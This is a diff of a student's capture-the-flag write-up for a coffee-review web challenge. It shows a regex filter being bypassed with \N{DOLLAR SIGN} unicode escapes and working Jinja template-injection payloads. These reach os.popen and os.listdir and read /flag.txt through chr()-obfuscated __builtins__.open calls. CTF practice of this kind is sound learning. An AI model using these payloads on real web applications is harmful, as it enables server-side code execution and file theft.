@@ -230,25 +230,23 @@ After solving locally, access the challenge server at http://sweethaven.nitephas
 
 ### Solution:
 
-- I first open the website where i am asked a username and password. I also look at the given python code and source code and static code.
-- The phython code first: We have been given the working of the website. the user can register and then submit a review. The code also reveeals filter checks.
-```
-  if re.search(r"(\\[xu0-9]|\$|'|APOSTROPHE)", review, re.IGNORECASE):
-    review = "Best coffee I had"
-```
-  meaning if x or u or Backslash + digits or $ or ' The literal word APOSTROPHE. If any of these appear, it REPLACES the whole review with "Best coffee I had". This means the challenge expects you to bypass this filter.
-  If it passes the filter, Then it does:
-```
-review = bytes(review, "utf-8").decode("unicode_escape")
-```
-It will interpret things like \N{…}, It will convert escaping sequences and It allows injecting characters normally filtered out. This gives potential filter bypass. We need to use SSTI.
-- I try to give different payloads, keeping in mind the filters. I am basically trying to see the classes of the Docker. first i put `\N{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` Which prints `Best coffee I ever had`. This means the the `\N` is giving some sort of a problem so i switch to `%5CN`
-- I input `%5CN{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` which again prints `Best coffee I ever had` and i realise that i am still using apostrophes so that is the problem. so i do it without apostrophe `%5CN{DOLLAR SIGN}{().__class__.__mro__[2].__subclasses__()}`.....which also did not work. in fact it kind of crashed and gave me this instead <img width="828" height="497" alt="image" src="https://github.com/user-attachments/assets/9cf4b597-dd13-4d92-b800-0bcc5a11d5b0" />
-- Anyways, i deleted the cookie and retried, this time checking for division of zero error `%5CN{DOLLAR SIGN}{(1/0).__class__.__mro__}` which gave
-  <img width="763" height="158" alt="image" src="https://github.com/user-attachments/assets/b297f509-0005-4604-bafb-efe7505cc9b2" />
-- after a couple more tries of different possible injections, i try `%5CN{DOLLAR SIGN}{().__class__.__base__.__subclasses__()}` and i get a lead
-  <img width="1703" height="798" alt="image" src="https://github.com/user-attachments/assets/22980e37-bb67-4ea8-965e-a3db1267b24c" />
-  now in this list i search for `<class 'subprocess.Popen'>` and note down its index number by using `%5CN{DOLLAR SIGN}{next(x for x in ().__class__.__base__.__subclasses__()ifx.__name__==chr(80)+chr(111)+chr(112)+chr(101)+chr(110))).__init__.__globals__[(chr(111)+chr(115))].popen((chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))).read()}`...which prints `expected token ',', got 'for'`
-- 
+- The website opens to a review writing page, anything i enter turns the review into "Best coffee I ever had" as implied in the source code.
+- On trying different things, by trial and error i got the regex. We cannot use `$` so instead we use `\N{DOLLAR SIGN}{payload}`. On entereing \N{DOLLAR SIGN}{7*7} in the reviews it shows 49 So i understand that we need to use SSTI.
+- <img width="1207" height="620" alt="image" src="https://github.com/user-attachments/assets/f2d2f061-a312-4331-ae26-151cd6c621d1" />
+- I try to see if we have access to FLASK globals now using `\\N{DOLLAR SIGN}{ url_for.__globals__ }`
+- <img width="802" height="305" alt="image" src="https://github.com/user-attachments/assets/6e4c234c-4085-4930-a255-56e9169c45db" /> I want to dump the objects inside `_globals_.` so i dump it.
+- Using `\N{DOLLAR SIGN}{ url_for.__globals__.os.listdir() }`, i get the output as all the directories which are shownn below
+  <img width="1268" height="237" alt="image" src="https://github.com/user-attachments/assets/9106aa4a-c3e3-4d05-9661-4c60362e5f84" />
+- I want to see the `flag.txt` (ALSO TO NOTE THAT THERE ARE SOME FILTERS PUT BECAUSE OF WHICH WE CANNOT USE `'`, `$`, `APOSTROPHE`, `unicode escapes`, ETC).
+- we can use `__builtins__` though so i (after MANY trials and errors) get
+  `\N{DOLLAR SIGN}{url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(47)+url_for.__globals__.__builtins__.chr(102)+url_for.__globals__.__builtins__.chr(108)+url_for.__globals__.__builtins__.chr(97)+url_for.__globals__.__builtins__.chr(103)+url_for.__globals__.__builtins__.chr(46)+url_for.__globals__.__builtins__.chr(116)+url_for.__globals__.__builtins__.chr(120)+url_for.__globals__.__builtins__.chr(116)).read()}`
+  AND I FINALLY GET THE FLAG :))
 
+***Flag:**: `nite{s5t1_w17h_un1c0d3_35c4p3_byp455}`
+
+### What I learnt:
+- how to use different ways to apply the same payload, especially useful when we have various filters so that we can bypass them.
+- How to figure out if we need SSTI or not (a lot of trial and error)
+- os.listdir() without args can give us much easier directory listings
+- 
 
